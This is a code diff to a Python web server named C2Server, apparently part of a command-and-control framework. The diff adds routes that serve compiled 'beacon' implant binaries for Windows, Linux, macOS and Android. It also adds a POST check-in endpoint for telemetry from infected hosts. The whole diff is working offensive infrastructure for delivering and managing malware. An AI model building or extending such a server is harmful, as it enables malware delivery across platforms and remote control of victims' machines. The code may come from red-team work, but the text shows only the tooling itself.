@@ -188,12 +188,20 @@ async def handle_result(request: web.Request) -> web.Response:
 
 
 async def handle_payload(request: web.Request) -> web.Response:
-    """GET /api/v1/payload — Serves the compiled beacon.exe."""
+    """GET /api/v1/payload[_<platform>] — Serves the compiled beacon binary."""
     try:
         import os
-        payload_path = os.path.join(os.path.dirname(__file__), "..", "payloads", "beacon", "beacon.exe")
+        # Map route to filename
+        platform_map = {
+            "/api/v1/payload": "beacon.exe",
+            "/api/v1/payload_linux": "beacon_linux",
+            "/api/v1/payload_macos": "beacon_macos",
+            "/api/v1/payload_android": "beacon_android",
+        }
+        filename = platform_map.get(request.path, "beacon.exe")
+        payload_path = os.path.join(os.path.dirname(__file__), "..", "payloads", "beacon", filename)
         if not os.path.exists(payload_path):
-            return web.Response(text="Payload not compiled yet.", status=404)
+            return web.Response(text=f"Payload '{filename}' not compiled yet.", status=404)
         return web.FileResponse(payload_path)
     except Exception as e:
         logger.error(f"Payload delivery error: {e}")
@@ -207,9 +215,16 @@ class C2Server:
         self.host = host
         self.port = port
         self.app = web.Application()
+        # Check-in: GET for normal heartbeat, POST for telemetry payload
         self.app.router.add_get("/api/v1/ping", handle_checkin)
+        self.app.router.add_post("/api/v1/ping", handle_checkin)
+        # Results
         self.app.router.add_post("/api/v1/result", handle_result)
+        # Payload delivery (all platforms)
         self.app.router.add_get("/api/v1/payload", handle_payload)
+        self.app.router.add_get("/api/v1/payload_linux", handle_payload)
+        self.app.router.add_get("/api/v1/payload_macos", handle_payload)
+        self.app.router.add_get("/api/v1/payload_android", handle_payload)
         self.runner: Optional[web.AppRunner] = None
         self.site: Optional[web.TCPSite] = None
         self.loop: Optional[asyncio.AbstractEventLoop] = None
